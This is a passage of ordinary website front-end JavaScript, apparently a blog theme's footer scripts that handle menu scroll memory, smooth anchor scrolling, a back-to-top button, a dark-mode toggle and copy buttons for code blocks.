</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>